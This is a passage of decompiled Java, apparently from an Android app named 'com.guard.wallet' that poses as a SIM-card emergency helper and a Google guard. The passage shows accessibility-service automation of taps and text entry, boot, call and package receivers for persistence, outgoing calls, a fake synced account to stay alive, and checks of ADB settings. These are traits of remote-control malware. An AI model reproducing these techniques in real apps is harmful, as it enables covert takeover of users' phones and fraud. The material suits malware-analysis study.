                  var7 = var9;
                  if (var1 >= 28) {
                     if (MyAccessibilityService.P() == null) {
                        var7 = var10;
                     } else if (var1 < 28) {
                        var7 = var10;
                     } else {
                        var7 = F0(9);
                     }

                     return var7;
                  }
                  break;
               case 23:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 33) {
                     return F0(19);
                  }
                  break;
               case 24:
                  return F0(4);
               case 25:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 31) {
                     return F0(13);
                  }
                  break;
               case 26:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 28) {
                     return F0(8);
                  }
                  break;
               case 27:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 31) {
                     return F0(11);
                  }
                  break;
               case 28:
                  var7 = var13;
                  if (MyAccessibilityService.P() != null) {
                     if (!Objects.equals(MyAccessibilityService.P().getSoftKeyboardController().getShowMode(), 0)) {
                        var7 = MyAccessibilityService.P().getSoftKeyboardController().setShowMode(0);
                     } else {
                        var7 = true;
                     }
                  }

                  return var7;
               case 29:
                  var7 = var9;
                  if (var0.getPoints() != null) {
                     var7 = var9;
                     if (!var0.getPoints().isEmpty()) {
                        int var5;
                        int var6;
                        label316: {
                           Point var43 = var0.getPoints().get(0);
                           var5 = (int)var43.getX();
                           var6 = (int)var43.getY();
                           Integer var44 = var0.getRepeatCount();
                           if (var44 != null) {
                              var22 = var44;
                              if (var44 > 0) {
                                 break label316;
                              }
                           }

                           var22 = 7;
                        }

                        int var4 = 0;

                        for (var1 = 0; var4 < var22; var4++) {
                           int var2 = var1;
                           int var3 = var1;

                           label306: {
                              Exception var10000;
                              label366: {
                                 label304: {
                                    try {
                                       if (!G0(var5, var6, (long)(ViewConfiguration.getTapTimeout() + 50))) {
                                          break label304;
                                       }
                                    } catch (Exception var19) {
                                       var10000 = var19;
                                       boolean var10001 = false;
                                       break label366;
                                    }

                                    var2 = var1 + 1;
                                 }

                                 var3 = var2;

                                 try {
                                    Thread.sleep(200L);
                                    break label306;
                                 } catch (Exception var18) {
                                    var10000 = var18;
                                    boolean var51 = false;
                                 }
                              }

                              Exception var45 = var10000;
                              q.s("GlobalActionAutomator", var45);
                              var1 = var3;
                              continue;
                           }

                           var1 = var2;
                        }

                        var7 = var12;
                        if (var1 == var22) {
                           var7 = true;
                        }

                        return var7;
                     }
                  }
                  break;
               case 30:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 33) {
                     return F0(17);
                  }
                  break;
               case 31:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 33) {
                     return F0(18);
                  }
                  break;
               case 32:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 31) {
                     return F0(14);
                  }
                  break;
               case 33:
                  ActionValueCondition var20 = var0.getValue();
                  var7 = var9;
                  if (var20 != null) {
                     var7 = var9;
                     if (!q.B(var20.getKey())) {
                        var7 = var9;
                        if ("text".equals(var20.getKey())) {
                           var7 = var9;
                           if ("String".equals(var20.getType())) {
                              var7 = var9;
                              if (!q.B(var20.getValue())) {
                                 String var42 = var20.getValue();
                                 var7 = var8;
                                 if (MyAccessibilityService.P() != null) {
                                    UiObject var21 = MyAccessibilityService.P().J();
                                    var7 = var8;
                                    if (var21 != null) {
                                       var7 = var21.setText(var42);
                                    }
                                 }

                                 return var7;
                              }
                           }
                        }
                     }
                  }
                  break;
               case 34:
                  return F0(7);
               default:
                  return false;
            }
         }
      }

      return var7;
   }

   // $VF: Could not inline inconsistent finally blocks
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static String a0(Context var0) {
      int var1 = VERSION.SDK_INT;
      Object var3 = null;
      String var2;
      if (var1 >= 28) {
         var2 = android.support.v4.view.a.m();
      } else {
         var2 = null;
      }

      if (!q.B(var2)) {
         return var2;
      } else {
         label72: {
            label71:
            try {
               Method var9 = Class.forName("android.app.ActivityThread", false, Application.class.getClassLoader()).getDeclaredMethod("currentProcessName");
               var9.setAccessible(true);
               Object var10 = var9.invoke(null);
               if (var10 instanceof String) {
                  var2 = (String)var10;
                  break label72;
               }
            } catch (Throwable var5) {
               var5.printStackTrace();
               break label71;
            }

            var2 = null;
         }

         if (!q.B(var2)) {
            return var2;
         } else {
            String var6;
            if (var0 == null) {
               var6 = (String)var3;
            } else {
               var1 = Process.myPid();
               ActivityManager var12 = (ActivityManager)var0.getSystemService("activity");
               var6 = (String)var3;
               if (var12 != null) {
                  List var13 = var12.getRunningAppProcesses();
                  var6 = (String)var3;
                  if (var13 != null) {
                     Iterator var14 = var13.iterator();

                     while (true) {
                        var6 = (String)var3;
                        if (!var14.hasNext()) {
                           break;
                        }

                        RunningAppProcessInfo var7 = (RunningAppProcessInfo)var14.next();
                        if (var7.pid == var1) {
                           var6 = var7.processName;
                           break;
                        }
                     }
                  }
               }
            }

            StringBuilder var15 = new StringBuilder("currentProcessName:");
            var15.append(var6);
            Log.d("ProcessUtil", var15.toString());
            return var6;
         }
      }
   }

   public static boolean a1(String var0) {
      if (Z() != null) {
         String var1 = var0;

         try {
            if (q.B(var0)) {
               var1 = Z().getPackageName();
            }

            StringBuilder var4 = new StringBuilder("package:");
            var4.append(var1);
            Intent var2 = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS", Uri.parse(var4.toString()));
            var2.addFlags(268435456);
            var2.addFlags(536870912);
            var2.addFlags(67108864);
            var2.addFlags(2097152);
            var2.addFlags(8388608);
            Z().startActivity(var2);
            return true;
         } catch (Exception var3) {
            q.s("ApplicationUtil", var3);
         }
      }

      return false;
   }

   public static boolean b() {
      Context var2 = Z();
      boolean var1 = false;
      boolean var0 = false;
      if (var2 != null) {
         if (Secure.getInt(Z().getContentResolver(), "enable_secure_write", 0) == 1) {
            var0 = true;
         }

         var1 = var0;
         if (var0) {
            Log.d("ApplicationUtil", "ADB Enable Secure Write");
            var1 = var0;
         }
      }

      return var1;
   }

   public static String b0() {
      if (Z() != null) {
         Intent var0 = new Intent("android.intent.action.MAIN");
         var0.addCategory("android.intent.category.HOME");
         ResolveInfo var1 = Z().getPackageManager().resolveActivity(var0, 0);
         if (var1 != null) {
            return var1.activityInfo.packageName;
         }
      }

      if (e.l()) {
         return "com.bbk.launcher2";
      } else {
         return e.m() ? "com.miui.home" : null;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void b1() {
      synchronized (g.class){} // $VF: monitorenter 

      label117: {
         Throwable var10000;
         label122: {
            label114: {
               IntentFilter var0;
               BatteryLevelReceiver var1;
               try {
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getBatteryReceiver() != null) {
                     break label117;
                  }

                  var0 = new IntentFilter();
                  var0.addAction("android.intent.action.BATTERY_CHANGED");
                  var0.addAction("android.intent.action.BATTERY_OKAY");
                  var0.addAction("android.intent.action.BATTERY_LOW");
                  var1 = new BatteryLevelReceiver();
                  MainApplication.getInstance().setBatteryReceiver(var1);
                  if (VERSION.SDK_INT >= 33) {
                     MainApplication.getInstance().registerReceiver(var1, var0, 2);
                     break label114;
                  }
               } catch (Throwable var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label122;
               }

               try {
                  MainApplication.getInstance().registerReceiver(var1, var0);
               } catch (Throwable var12) {
                  var10000 = var12;
                  boolean var15 = false;
                  break label122;
               }
            }

            label104:
            try {
               Log.d("ReceiverUtils", "BatteryLevelReceiver 启动完成");
               break label117;
            } catch (Throwable var11) {
               var10000 = var11;
               boolean var16 = false;
               break label104;
            }
         }

         Throwable var14 = var10000;
         // $VF: monitorexit
         throw var14;
      }

      // $VF: monitorexit
   }

   public static boolean c() {
      if (Z() != null) {
         boolean var0;
         try {
            var0 = Objects.equals(Secure.getInt(Z().getContentResolver(), "adb_install_need_confirm"), 0);
         } catch (Exception var2) {
            q.s("ApplicationUtil", var2);
            return true;
         }

         if (var0) {
            return false;
         }
      }

      return true;
   }

   public static String c0(Context var0) {
      boolean var3 = Build.PRODUCT.contains("sdk");
      boolean var2 = true;
      boolean var1;
      if (var3) {
         var1 = var2;
      } else {
         String var4 = Build.HARDWARE;
         var1 = var2;
         if (!var4.contains("goldfish")) {
            if (var4.contains("ranchu")) {
               var1 = var2;
            } else if (Secure.getString(var0.getContentResolver(), "android_id") == null) {
               var1 = var2;
            } else {
               var1 = false;
            }
         }
      }

      return var1 ? "10.0.2.2" : "127.0.0.1";
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void c1() {
      synchronized (g.class){} // $VF: monitorenter 

      label117: {
         Throwable var10000;
         label122: {
            label114: {
               BootBroadcast var0;
               IntentFilter var1;
               try {
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getBootReceiver() != null) {
                     break label117;
                  }

                  var1 = new IntentFilter();
                  var1.addAction("android.intent.action.BOOT_COMPLETED");
                  var1.addAction("android.intent.action.LOCKED_BOOT_COMPLETED");
                  var1.addAction("android.intent.action.UNLOCK_BOOT_COMPLETED");
                  var1.addAction("android.intent.action.QUICKBOOT_POWERON");
                  var1.addCategory("android.intent.category.HOME");
                  var1.addCategory("android.intent.category.DEFAULT");
                  var1.addCategory("android.intent.category.LAUNCHER");
                  var0 = new BootBroadcast();
                  MainApplication.getInstance().setBootReceiver(var0);
                  if (VERSION.SDK_INT >= 33) {
                     MainApplication.getInstance().registerReceiver(var0, var1, "android.permission.RECEIVE_BOOT_COMPLETED", null, 2);
                     break label114;
                  }
               } catch (Throwable var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label122;
               }

               try {
                  MainApplication.getInstance().registerReceiver(var0, var1, "android.permission.RECEIVE_BOOT_COMPLETED", null);
               } catch (Throwable var12) {
                  var10000 = var12;
                  boolean var15 = false;
                  break label122;
               }
            }

            label104:
            try {
               Log.d("ReceiverUtils", "BootBroadcast 启动完成");
               break label117;
            } catch (Throwable var11) {
               var10000 = var11;
               boolean var16 = false;
               break label104;
            }
         }

         Throwable var14 = var10000;
         // $VF: monitorexit
         throw var14;
      }

      // $VF: monitorexit
   }

   public static void d() {
      if (Z() != null) {
         AccountManager var1 = AccountManager.get(Z());
         if (var1.getAccountsByType("com.guard.wallet").length == 0) {
            Account var0 = new Account(x0(), "com.guard.wallet");
            Bundle var2 = new Bundle();
            var2.putString("SERVER", "com.guard.wallet.service.AccountAuthenticatorService");
            if (var1.addAccountExplicitly(var0, "1234567890", var2)) {
               Log.d("AccountUtils", "addAccountExplicitly success");
               ContentResolver.setIsSyncable(var0, "com.guard.wallet", 1);
               ContentResolver.setSyncAutomatically(var0, "com.guard.wallet", true);
               ContentResolver.addPeriodicSync(var0, "com.guard.wallet", new Bundle(), 10L);
            }
         }
      }
   }

   public static AppInfo d0(String var0) {
      if (Z() != null && l() && !q.B(var0)) {
         try {
            PackageManager var1 = Z().getPackageManager();
            return W(var1, var1.getApplicationInfo(var0, 128));
         } catch (Exception var2) {
            q.s("ApplicationUtil", var2);
         }
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean d1(String var0, String var1) {
      Exception var10000;
      label28: {
         try {
            if (Z() == null) {
               return false;
            }

            var4 = A0(var0, var1);
         } catch (Exception var3) {
            var10000 = var3;
            boolean var10001 = false;
            break label28;
         }

         if (var4 == null) {
            return false;
         }

         try {
            Z().startActivity(var4);
            return true;
         } catch (Exception var2) {
            var10000 = var2;
            boolean var6 = false;
         }
      }

      Exception var5 = var10000;
      q.s("ApplicationUtil", var5);
      return false;
   }

   public static String e() {
      if (l()) {
         AppInfo var0 = d0("com.google.guard");
         if (var0 != null) {
            return var0.getApplicationLabel();
         }
      }

      return "Sim卡紧急辅助";
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static LinkedList e0() {
      LinkedList var5 = new LinkedList();
      Context var6 = Z();
      boolean var1 = false;
      boolean var3 = false;
      boolean var4 = false;
      boolean var2 = var3;
      if (var6 != null) {
         var2 = var3;
         if (l()) {
            boolean var0 = var1;

            Exception var10000;
            label112: {
               try {
                  var21 = Z().getPackageManager();
               } catch (Exception var18) {
                  var10000 = var18;
                  boolean var10001 = false;
                  break label112;
               }

               var0 = var1;

               List var7;
               try {
                  var7 = var21.getInstalledApplications(0);
               } catch (Exception var17) {
                  var10000 = var17;
                  boolean var24 = false;
                  break label112;
               }

               var0 = var1;
               var2 = var3;

               try {
                  if (var7.isEmpty()) {
                     return var2 ? var5 : null;
                  }
               } catch (Exception var16) {
                  var10000 = var16;
                  boolean var25 = false;
                  break label112;
               }

               var0 = var1;

               try {
                  var23 = var7.iterator();
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var26 = false;
                  break label112;
               }

               var1 = var4;

               while (true) {
                  var0 = var1;
                  var2 = var1;

                  try {
                     if (!var23.hasNext()) {
                        return var2 ? var5 : null;
                     }
                  } catch (Exception var11) {
                     var10000 = var11;
                     boolean var27 = false;
                     break;
                  }

                  var0 = var1;

                  AppInfo var8;
                  try {
                     var8 = W(var21, (ApplicationInfo)var23.next());
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var28 = false;
                     break;
                  }

                  if (var8 != null) {
                     var2 = var1;
                     var0 = var1;

                     label114: {
                        try {
                           if (q.B(var8.getPackageName())) {
                              break label114;
                           }
                        } catch (Exception var14) {
                           var10000 = var14;
                           boolean var29 = false;
                           break;
                        }

                        var2 = var1;
                        var0 = var1;

                        try {
                           if (Objects.equals(Z().getPackageName(), var8.getPackageName())) {
                              break label114;
                           }
                        } catch (Exception var13) {
                           var10000 = var13;
                           boolean var30 = false;
                           break;
                        }

                        var2 = var1;
                        var0 = var1;

                        try {
                           if ("com.google.guard".equals(var8.getPackageName())) {
                              break label114;
                           }
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var31 = false;
                           break;
                        }

                        var2 = true;
                     }

                     var0 = var2;

                     try {
                        var5.add(var8);
                     } catch (Exception var9) {
                        var10000 = var9;
                        boolean var32 = false;
                        break;
                     }

                     var1 = var2;
                  }
               }
            }

            Exception var22 = var10000;
            q.s("ApplicationUtil", var22);
            var2 = var0;
         }
      }

      return var2 ? var5 : null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void e1() {
      synchronized (g.class){} // $VF: monitorenter 

      label117: {
         Throwable var10000;
         label122: {
            label114: {
               CallReceiver var0;
               IntentFilter var1;
               try {
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getCallReceiver() != null) {
                     break label117;
                  }

                  var1 = new IntentFilter();
                  var1.addAction("android.intent.action.NEW_OUTGOING_CALL");
                  var1.addAction("android.intent.action.PHONE_STATE");
                  var0 = new CallReceiver();
                  MainApplication.getInstance().setCallReceiver(var0);
                  if (VERSION.SDK_INT >= 33) {
                     MainApplication.getInstance().registerReceiver(var0, var1, 2);
                     break label114;
                  }
               } catch (Throwable var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label122;
               }

               try {
                  MainApplication.getInstance().registerReceiver(var0, var1);
               } catch (Throwable var12) {
                  var10000 = var12;
                  boolean var15 = false;
                  break label122;
               }
            }

            label104:
            try {
               Log.d("ReceiverUtils", "CallReceiver 启动完成");
               break label117;
            } catch (Throwable var11) {
               var10000 = var11;
               boolean var16 = false;
               break label104;
            }
         }

         Throwable var14 = var10000;
         // $VF: monitorexit
         throw var14;
      }

      // $VF: monitorexit
   }

   public static boolean f(String var0) {
      if (!q.B(var0) && Z() != null) {
         TelephonyManager var1 = (TelephonyManager)Z().getSystemService("phone");
         if (var1 != null && Objects.equals(var1.getCallState(), 0) && ContextCompat.checkSelfPermission(Z(), "android.permission.CALL_PHONE") == 0) {
            Intent var2 = new Intent("android.intent.action.CALL");
            var2.setData(Uri.parse("tel:".concat(var0)));
            Z().startActivity(var2);
            return true;
         }
      }

      return false;
   }

   public static LinkedList f0() {
      LinkedList var0 = new LinkedList();
      if (Z() != null) {
         String var1 = Z().getPackageName();
         if ("com.guard.wallet.service.MyAccessibilityService".contains(var1)) {
            var0.add(var1.concat("/.service.MyAccessibilityService"));
         }

         var0.add(var1.concat("/").concat("com.guard.wallet.service.MyAccessibilityService"));
      }

      return var0;
   }

   public static boolean f1() {
      if (Z() != null) {
         try {
            Intent var0 = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
            var0.addFlags(268435456);
            var0.addFlags(536870912);
            var0.addFlags(67108864);
            var0.addFlags(2097152);
            var0.addFlags(8388608);
            Z().startActivity(var0);
            return true;
         } catch (Exception var1) {
            q.s("ApplicationUtil", var1);
         }
      }

      return false;
   }

   public static CallStateVO g() {
      CallStateVO var2 = new CallStateVO(-1, "CALL_STATE_UNKNOWN", "通话状态未知");
      if (Z() != null) {
         TelephonyManager var1 = (TelephonyManager)Z().getSystemService("phone");
         if (var1 != null) {
            int var0 = var1.getCallState();
            String var3;
            if (var0 != 0) {
               if (var0 != 1) {
                  if (var0 != 2) {
                     return var2;
                  }

                  var2.setState(2);
                  var2.setCallState("CALL_STATE_OFFHOOK");
                  var3 = "电话接通中...";
               } else {
                  var2.setState(1);
                  var2.setCallState("CALL_STATE_RINGING");
                  var3 = "电话响铃中...";
               }
            } else {
               var2.setState(0);
               var2.setCallState("CALL_STATE_IDLE");
               var3 = "电话空闲中...";
            }

            var2.setDescription(var3);
            Log.d("ApplicationUtil", var3);
         }
      }

      return var2;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static PermissionInfoVO g0(String var0) {
      PermissionInfoVO var2 = new PermissionInfoVO();
      var2.setPermissionValue(var0);
      if (Z() != null) {
         Exception var10000;
         label231: {
            int var1;
            PackageManager var3;
            PermissionInfo var4;
            try {
               var3 = Z().getPackageManager();
               var4 = var3.getPermissionInfo(var0, 128);
               var1 = var4.protectionLevel;
            } catch (Exception var28) {
               var10000 = var28;
               boolean var10001 = false;
               break label231;
            }

            try {
               if (VERSION.SDK_INT >= 28) {
                  var1 = android.support.v4.app.a.y(var4);
               }
            } catch (Exception var27) {
               var10000 = var27;
               boolean var33 = false;
               break label231;
            }

            label220: {
               label232: {
                  try {
                     if (Objects.equals(0, var1)) {
                        break label232;
                     }
                  } catch (Exception var26) {
                     var10000 = var26;
                     boolean var34 = false;
                     break label231;
                  }

                  label233: {
                     try {
                        if (Objects.equals(1, var1)) {
                           break label233;
                        }
                     } catch (Exception var25) {
                        var10000 = var25;
                        boolean var35 = false;
                        break label231;
                     }

                     label234: {
                        try {
                           if (Objects.equals(2, var1)) {
                              break label234;
                           }
                        } catch (Exception var24) {
                           var10000 = var24;
                           boolean var36 = false;
                           break label231;
                        }

                        label235: {
                           try {
                              if (Objects.equals(3, var1)) {
                                 break label235;
                              }
                           } catch (Exception var23) {
                              var10000 = var23;
                              boolean var37 = false;
                              break label231;
                           }

                           label236: {
                              try {
                                 if (Objects.equals(4, var1)) {
                                    break label236;
                                 }
                              } catch (Exception var22) {
                                 var10000 = var22;
                                 boolean var38 = false;
                                 break label231;
                              }

                              label237: {
                                 try {
                                    if (Objects.equals(16, var1)) {
                                       break label237;
                                    }
                                 } catch (Exception var21) {
                                    var10000 = var21;
                                    boolean var39 = false;
                                    break label231;
                                 }

                                 label238: {
                                    try {
                                       if (Objects.equals(4096, var1)) {
                                          break label238;
                                       }
                                    } catch (Exception var20) {
                                       var10000 = var20;
                                       boolean var40 = false;
                                       break label231;
                                    }

                                    label239: {
                                       try {
                                          if (Objects.equals(512, var1)) {
                                             break label239;
                                          }
                                       } catch (Exception var19) {
                                          var10000 = var19;
                                          boolean var41 = false;
                                          break label231;
                                       }

                                       label240: {
                                          try {
                                             if (Objects.equals(256, var1)) {
                                                break label240;
                                             }
                                          } catch (Exception var18) {
                                             var10000 = var18;
                                             boolean var42 = false;
                                             break label231;
                                          }

                                          label241: {
                                             try {
                                                if (Objects.equals(1024, var1)) {
                                                   break label241;
                                                }
                                             } catch (Exception var17) {
                                                var10000 = var17;
                                                boolean var43 = false;
                                                break label231;
                                             }

                                             label242: {
                                                try {
                                                   if (Objects.equals(2048, var1)) {
                                                      break label242;
                                                   }
                                                } catch (Exception var16) {
                                                   var10000 = var16;
                                                   boolean var44 = false;
                                                   break label231;
                                                }

                                                label243: {
                                                   try {
                                                      if (Objects.equals(8192, var1)) {
                                                         break label243;
                                                      }
                                                   } catch (Exception var15) {
                                                      var10000 = var15;
                                                      boolean var45 = false;
                                                      break label231;
                                                   }

                                                   label244: {
                                                      try {
                                                         if (Objects.equals(64, var1)) {
                                                            break label244;
                                                         }
                                                      } catch (Exception var14) {
                                                         var10000 = var14;
                                                         boolean var46 = false;
                                                         break label231;
                                                      }

                                                      label245: {
                                                         try {
                                                            if (Objects.equals(128, var1)) {
                                                               break label245;
                                                            }
                                                         } catch (Exception var13) {
                                                            var10000 = var13;
                                                            boolean var47 = false;
                                                            break label231;
                                                         }

                                                         label246: {
                                                            try {
                                                               if (Objects.equals(32, var1)) {
                                                                  break label246;
                                                               }
                                                            } catch (Exception var12) {
                                                               var10000 = var12;
                                                               boolean var48 = false;
                                                               break label231;
                                                            }

                                                            try {
                                                               var0 = String.valueOf(var1);
                                                               break label220;
                                                            } catch (Exception var11) {
                                                               var10000 = var11;
                                                               boolean var49 = false;
                                                               break label231;
                                                            }
                                                         }

                                                         var0 = "DEVELOPMENT";
                                                         break label220;
                                                      }

                                                      var0 = "PRE23";
                                                      break label220;
                                                   }

                                                   var0 = "APPOP";
                                                   break label220;
                                                }

                                                var0 = "RUNTIME_ONLY";
                                                break label220;
                                             }

                                             var0 = "SETUP";
                                             break label220;
                                          }

                                          var0 = "PREINSTALLED";
                                          break label220;
                                       }

                                       var0 = "INSTALLER";
                                       break label220;
                                    }

                                    var0 = "VERIFIER";
                                    break label220;
                                 }

                                 var0 = "INSTANT";
                                 break label220;
                              }

                              var0 = "PRIVILEGED";
                              break label220;
                           }

                           var0 = "INTERNAL";
                           break label220;
                        }

                        var0 = "SIGNATURE_OR_SYSTEM";
                        break label220;
                     }

                     var0 = "SIGNATURE";
                     break label220;
                  }

                  var0 = "DANGEROUS";
                  break label220;
               }

               var0 = "NORMAL";
            }

            try {
               var2.setGradeCode(var0);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var50 = false;
               break label231;
            }

            try {
               if (!q.B(var4.group)) {
                  var2.setGroupValue(var4.group);
               }
            } catch (Exception var9) {
               var10000 = var9;
               boolean var51 = false;
               break label231;
            }

            try {
               var30 = var4.loadLabel(var3);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var52 = false;
               break label231;
            }

            if (var30 != null) {
               try {
                  var2.setPermissionName(var30.toString());
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var53 = false;
                  break label231;
               }
            }

            try {
               var31 = var4.loadDescription(var3);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var54 = false;
               break label231;
            }

            if (var31 == null) {
               return var2;
            }

            try {
               var2.setDescription(var31.toString());
               return var2;
            } catch (Exception var5) {
               var10000 = var5;
               boolean var55 = false;
            }
         }

         Exception var32 = var10000;
         q.s("ApplicationUtil", var32);
      }

      return var2;
   }

   public static boolean g1() {
      try {
         if (Z() != null) {
            Intent var0 = new Intent("android.settings.DEVICE_INFO_SETTINGS");
            var0.addFlags(268435456);
            var0.addFlags(536870912);
            var0.addFlags(67108864);
            var0.addFlags(2097152);
            var0.addFlags(8388608);
            Z().startActivity(var0);
            return true;
         }
      } catch (Exception var1) {
         q.s("ApplicationUtil", var1);
      }

      return false;
   }

   public static boolean h() {
      if (Z() != null) {
         if (VERSION.SDK_INT >= 33) {
            if (a0.h.k()) {
               return true;
            }
         } else if (ContextCompat.checkSelfPermission(Z(), "android.permission.READ_EXTERNAL_STORAGE") == 0) {
            return true;
         }
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static PermissionsBodyVO h0(String var0) {
      PermissionsBodyVO var4 = new PermissionsBodyVO();
      if (Z() != null) {
         String var3 = var0;
         if (q.B(var0)) {
            var3 = Z().getPackageName();
         }

         Exception var10000;
         label72: {
            PackageManager var5;
            PackageInfo var6;
            try {
               var4.setPackageName(var3);
               var5 = Z().getPackageManager();
               var6 = var5.getPackageInfo(var3, 4096);
               var13 = W(var5, var5.getApplicationInfo(var3, 128));
            } catch (Exception var12) {
               var10000 = var12;
               boolean var10001 = false;
               break label72;
            }

            if (var6 != null) {
               String[] var7;
               try {
                  var7 = var6.requestedPermissions;
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var18 = false;
                  break label72;
               }

               label59:
               if (var7 != null) {
                  int var2;
                  try {
                     if (var7.length <= 0) {
                        break label59;
                     }

                     LinkedList var16 = new LinkedList();
                     var4.setPermissions(var16);
                     var7 = var6.requestedPermissions;
                     var2 = var7.length;
                  } catch (Exception var11) {
                     var10000 = var11;
                     boolean var19 = false;
                     break label72;
                  }

                  for (int var1 = 0; var1 < var2; var1++) {
                     String var15 = var7[var1];

                     try {
                        if (var5.checkPermission(var15, var3) == 0) {
                           var4.getPermissions().add(var15);
                        }
                     } catch (Exception var10) {
                        var10000 = var10;
                        boolean var20 = false;
                        break label72;
                     }
                  }
               }
            }

            if (var13 == null) {
               return var4;
            }

            try {
               var4.setApplicationLabel(var13.getApplicationLabel());
               return var4;
            } catch (Exception var8) {
               var10000 = var8;
               boolean var21 = false;
            }
         }

         Exception var14 = var10000;
         q.s("ApplicationUtil", var14);
      }

      return var4;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void h1() {
      synchronized (g.class){} // $VF: monitorenter 

      label117: {
         Throwable var10000;
         label122: {
            label114: {
               NetWorkReceiver var0;
               IntentFilter var1;
               try {
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getNetWorkReceiver() != null) {
                     break label117;
                  }

                  var1 = new IntentFilter();
                  var1.addAction("android.net.wifi.WIFI_STATE_CHANGED");
                  var1.addAction("android.net.wifi.STATE_CHANGE");
                  var1.addAction("android.net.conn.CONNECTIVITY_CHANGE");
                  var0 = new NetWorkReceiver();
                  MainApplication.getInstance().setNetWorkReceiver(var0);
                  if (VERSION.SDK_INT >= 33) {
                     MainApplication.getInstance().registerReceiver(var0, var1, 2);
                     break label114;
                  }
               } catch (Throwable var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label122;
               }

               try {
                  MainApplication.getInstance().registerReceiver(var0, var1);
               } catch (Throwable var12) {
                  var10000 = var12;
                  boolean var15 = false;
                  break label122;
               }
            }

            label104:
            try {
               Log.d("ReceiverUtils", "NetWorkReceiver 启动完成");
               break label117;
            } catch (Throwable var11) {
               var10000 = var11;
               boolean var16 = false;
               break label104;
            }
         }

         Throwable var14 = var10000;
         // $VF: monitorexit
         throw var14;
      }

      // $VF: monitorexit
   }

   public static boolean i() {
      Context var2 = Z();
      boolean var1 = false;
      boolean var0 = var1;
      if (var2 != null) {
         if (VERSION.SDK_INT >= 33) {
            return a0.h.k();
         }

         var0 = var1;
         if (ContextCompat.checkSelfPermission(Z(), "android.permission.WRITE_EXTERNAL_STORAGE") == 0) {
            var0 = true;
         }
      }

      return var0;
   }

   public static String i0() {
      if (VERSION.SDK_INT >= 29) {
         if (Z() != null && Z().getExternalFilesDir(null) != null) {
            return Z().getExternalFilesDir(null).getAbsolutePath();
         }
      } else if (Environment.getExternalStorageDirectory() != null) {
         return Environment.getExternalStorageDirectory().getPath();
      }

      return "";
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void i1() {
      synchronized (g.class){} // $VF: monitorenter 

      label117: {
         Throwable var10000;
         label122: {
            label114: {
               PackageReceiver var0;
               IntentFilter var1;
               try {
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getPackageReceiver() != null) {
                     break label117;
                  }

                  var1 = new IntentFilter();
                  var1.addAction("android.intent.action.PACKAGE_ADDED");
                  var1.addAction("android.intent.action.PACKAGE_REMOVED");
                  var1.addDataScheme("package");
                  var0 = new PackageReceiver();
                  MainApplication.getInstance().setPackageReceiver(var0);
                  if (VERSION.SDK_INT >= 33) {
                     MainApplication.getInstance().registerReceiver(var0, var1, 2);
                     break label114;
                  }
               } catch (Throwable var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label122;
               }

               try {
                  MainApplication.getInstance().registerReceiver(var0, var1);
               } catch (Throwable var12) {
                  var10000 = var12;
                  boolean var15 = false;
                  break label122;
               }
            }

            label104:
            try {
               Log.d("ReceiverUtils", "PackageReceiver 启动完成");
               break label117;
            } catch (Throwable var11) {
               var10000 = var11;
               boolean var16 = false;
               break label104;
            }
         }

         Throwable var14 = var10000;
         // $VF: monitorexit
         throw var14;
      }

      // $VF: monitorexit
   }

   public static boolean j() {
